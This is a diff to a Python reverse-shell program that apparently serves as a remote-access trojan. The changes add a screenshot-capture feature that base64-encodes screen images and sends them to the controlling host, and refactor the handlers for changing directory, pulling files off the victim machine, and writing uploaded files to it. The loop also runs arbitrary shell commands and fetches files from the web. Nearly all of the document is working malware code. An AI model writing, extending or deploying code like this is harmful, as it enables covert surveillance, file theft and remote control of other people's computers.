@@ -2,15 +2,16 @@
 #-----------------------------------------------------------------------------------------------------
 # rev_shell
 #-----------------------------------------------------------------------------------------------------
-import socket
-import subprocess
-import json
-import time
 import os
 import sys
+import json
+import time
+import socket
 import shutil
 import base64
 import requests
+import pyautogui
+import subprocess
 
 class reverse_shell:
     sock = None
@@ -62,35 +63,59 @@ class reverse_shell:
             except:
                 return "[error]: Failed to download"
 
+    def take_screenshot(self):
+        filename = time.strftime("%Y-%m-%d_%H-%M-%S", time.gmtime()) + ".png"
+        try:
+            print "taking cap"
+            pyautogui.screenshot(filename)
+            print "took cap "
+            with open(filename, "rb") as cap_file:
+                self.reliable_send(base64.b64encode(cap_file.read()))
+        except:
+            self.reliable_send("[error]: unable to take screenshot")
+
+    def reply_change_dir(self, command):
+        try:
+            os.chdir(command[3:])
+            self.reliable_send(os.getcwd())
+        except:
+            self.reliable_send("[error]: no such directory")
+    
+    def reply_download(self, command):
+        try:
+            with open(command[9:],"rb") as file_for_upload:
+                self.reliable_send(base64.b64encode(file_for_upload.read()))
+        except:
+            self.reliable_send("[error]: no such file")
+
+    def reply_upload(self, command):
+        uploaded_data = self.reliable_recv()
+        if not uploaded_data == "failed":
+            with open(command[7:], "wb") as uploaded_file:
+                uploaded_file.write(base64.b64decode(uploaded_data))
+
     def run_rev_shell(self):
         while True:
             command = self.reliable_recv()
             if command == "q" or command == "quit" or command == "exit":
                 break
+            
             elif len(command)>1 and command[:2] == "cd":
-                try:
-                    os.chdir(command[3:])
-                    self.reliable_send(os.getcwd())
-                except:
-                    self.reliable_send("[error]: no such directory")
-                    continue
+                self.reply_change_dir(command)
+                continue
+            
             elif len(command)>=8 and command[:8] == "download":
-                try:
-                    with open(command[9:],"rb") as file_for_upload:
-                        self.reliable_send(base64.b64encode(file_for_upload.read()))
-                except:
-                    self.reliable_send("[error]: no such file")
+                self.reply_download(command)
+            
             elif len(command)>=6 and command[:6] == "upload":
-                uploaded_data = self.reliable_recv()
-                if not uploaded_data == "failed":
-                    with open(command[7:], "wb") as uploaded_file:
-                        uploaded_file.write(base64.b64decode(uploaded_data))
-                        continue
-                else:
-                    continue
-                    #print "error "+ command[7:]
+                self.reply_upload(command)
+                continue
+            
             elif len(command)>=4 and command[:4] == "wget":
                 self.reliable_send(self.download_from_internet(command[5:]))
+            
+            elif len(command)>=10 and command[:10] == "screenshot":
+                self.take_screenshot()
             else:
                 try:
                     process = subprocess.Popen(command , shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
